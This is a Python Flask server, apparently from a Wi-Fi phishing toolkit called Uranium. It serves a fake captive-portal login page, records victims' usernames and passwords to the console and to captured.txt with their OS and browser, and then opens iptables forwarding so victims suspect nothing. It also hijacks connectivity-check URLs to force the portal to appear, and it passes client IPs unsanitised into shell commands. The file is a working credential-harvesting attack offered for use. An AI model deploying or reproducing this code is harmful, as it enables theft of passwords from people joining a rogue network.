from flask import Flask, redirect, url_for, request, render_template, request
from modules.banner import bstring
from threading import Timer
import os
import argparse
import datetime
import flask.cli
import logging
import re

parser = argparse.ArgumentParser(description='Uranium http server options help')
parser._action_groups.pop()
requiredNamed = parser.add_argument_group('required') ### REQUIRED ARGS ###
requiredNamed.add_argument(
        "-t",
        "--template",
        type=str,
        required=True,
        help=("Template " +
            "Example: -t [template_name]"))
requiredNamed.add_argument(
        "-p",
        "--port",
        type=int,
        required=True,
        help=("Choose port for python http server. " +
            "All processes on that port will be killed! " + 
            "Example: -p 80"))
optionalNamed = parser.add_argument_group('optional') ### OPTIONAL ARGS ###
optionalNamed.add_argument(
        "-l",
        "--local",
        action='store_true',
        required=False,
        help=("Local mode. " +
            "Uses localhost as default hostname " + 
            "Use if you are making captive portal templates " +
            "Example: -l"))
optionalNamed.add_argument(
        "-n",
        "--nointernet",
        action='store_true',
        required=False,
        help=("Do not enable internet after client login successfuly. " +
            "Example: -n"))
optionalNamed.add_argument(
        "-v",
        "--verbose",
        action='store_true',
        required=False,
        help=("Unhide default flask messages like GET/POST etc. " +
            "Example: -v"))

args = parser.parse_args()

PORT = (args.port)
template = args.template


flask.cli.show_server_banner = lambda *args: None # disable flask app default messages

if args.verbose is False:
    log = logging.getLogger('werkzeug')
    log.setLevel(logging.ERROR)

app = Flask(__name__)

def email_vaildation(email):
   pattern = "^[a-zA-Z0-9-_]+@[a-zA-Z0-9]+\.[a-z]{1,3}$" #Pattern found in network :P
   if re.match(pattern,email):
      return True
   return False

def enable_network(client_ip):

    os.system("iptables -t nat -I PREROUTING 1 -s " + client_ip + " -j ACCEPT")
    os.system("iptables -I FORWARD -s " + client_ip + " -j ACCEPT")
    request.close() #close retirection page so device will check for network


@app.route('/redirect_page/')
def redirect_page():
    return render_template('%s/redirect.html' % (template)) 

blacklist = []

@app.route("/", methods=["POST", "GET"])
def login():
    user_agent_os = str(request.user_agent.platform)
    user_agent_browser = str(request.user_agent.browser)

    client = None
    if request.environ.get('HTTP_X_REAL_IP') is not None:
        client = str(request.environ.get('HTTP_X_REAL_IP'))
    else:
        client = str(request.environ.get('REMOTE_ADDR'))

    if client not in blacklist:
        blacklist.append(client)
        print(bstring.INFO + bstring.VIOLET, client + bstring.RESET, "connected", "| OS:"+ bstring.VIOLET, user_agent_os + bstring.RESET, "| Browser:" + bstring.VIOLET, user_agent_browser + bstring.RESET)
    
    error = None
    if request.method == "POST":

        current_date = str(datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")) 
        username = request.form['username']
        password = request.form['password']

        if username == '' or password == '':
            print(bstring.INFO, "Catched empty input, sending error message to client!")
            error = "Username or password can't be empty!"
            return render_template('%s/login.html' % (template), error=error) 
        if email_vaildation(username) == False:
            print(bstring.INFO, "Catched invaild email, sending error message to client!")
            error = "Can't find account with given e-mail!"
            return render_template('%s/login.html' % (template), error=error) 

        else:
            print(bstring.CREDS, "Captured client input!")
            print("""
----------------------------
Date: """ + bstring.BLUE + current_date + bstring.RESET + """
----------------------------
Username: """ + bstring.GREEN + username + bstring.RESET + """
Password: """ + bstring.GREEN + password + bstring.RESET + """
----------------------------
""")    
            file = open("captured.txt", "a")
            file.write("""
Date: """ + current_date + """
|
OS: """ + user_agent_os + """
Browser: """ + user_agent_browser + """
|
Username: """ + username + """
Password: """ + password + """
----------------------------""")
            file.close
            if args.nointernet is True:
                print(bstring.INFO, "No internet option is enabled, keeping internet access disabled for:", client)
            else:
                print(bstring.ACTION, "Enabling internet access for:", client)
                enable_network(client)
            
            return redirect(url_for("redirect_page"))
    else:
        return render_template('%s/login.html' % (template), code=302) 

@app.route('/generate_204')
@app.route('/gen_204')
@app.route('/hotspot-detect.html')
def android():
    return redirect("http://10.0.0.1/", code=302)

@app.route('/favicon.ico')
def favicon():
    return app.send_static_file('favicon.ico')

# @app.route('/images/<filename>')
# def images_folder(filename):  
#     return send_from_directory('images', filename)

# @app.route('/css/<filename>')
# def css_folder(filename):  
#     return send_from_directory('css', filename)

# @app.route('/js/<filename>')
# def js_folder(filename):  
#     return send_from_directory('js', filename)

if __name__ == '__main__':
    print(bstring.BOLD + "[ Uranium Flask Server v1.0 ]" + bstring.RESET)

    if args.local is True:
        HOST_NAME = "127.0.0.1"
        print(bstring.INFO, 'Using local hostname for testing captive portal templates:', HOST_NAME + '. Thanks for support!') 
    else:
        HOST_NAME = "10.0.0.1"

    print(bstring.INFO, "Server started http://%s:%s" % (HOST_NAME,PORT))
    try:
        app.run(host=HOST_NAME, port=PORT)
    except KeyboardInterrupt:
        pass
        app.stop()
        print("\n" + "Server stopped")

